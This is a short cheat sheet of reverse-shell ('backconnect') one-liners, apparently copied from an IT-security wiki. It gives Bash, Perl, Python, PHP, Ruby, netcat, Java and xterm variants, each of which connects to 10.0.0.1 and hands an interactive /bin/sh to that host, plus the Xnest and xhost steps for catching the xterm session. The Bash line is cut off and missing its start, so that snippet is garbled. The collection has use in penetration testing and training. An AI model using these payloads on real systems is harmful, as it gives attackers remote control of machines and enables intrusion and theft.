# Remote Code Execution
__Backconnect__

Bash
```bash
    & /dev/tcp/10.0.0.1/8080 0>&1
```
PERL
```perl
    use Socket;
    $i="10.0.0.1";
    $p=1234;
    socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));
    if(connect(S,sockaddr_in($p,inet_aton($i)))){
      open(STDIN,">&S");
      open(STDOUT,">&S");
      open(STDERR,">&S");
      exec("/bin/sh -i");
    };
```
Python
```python
import socket,subprocess,os;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("10.0.0.1",1234));
os.dup2(s.fileno(),0);
os.dup2(s.fileno(),1);
os.dup2(s.fileno(),2);
p=subprocess.call(["/bin/sh","-i"]);
```
PHP
```
    $sock=fsockopen("10.0.0.1",1234);
    exec("/bin/sh -i <&3 >&3 2>&3");
```
Ruby
```ruby
f=TCPSocket.open("10.0.0.1",1234).to_i;
exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)
```
Netcat
```bash
nc -e /bin/sh 10.0.0.1 1234
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
```
Java
```java
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```
xterm
```
    xterm -display 10.0.0.1:1
```
To catch the incoming xterm, start an X-Server (:1 – which listens on TCP port 6001). One way to do this is with Xnest (to be run on your system):
```
    Xnest :1
```    
You’ll need to authorise the target to connect to you (command also run on your host):
```
    xhost +targetip
```


----
взято с сайта http://itsecwiki.org/
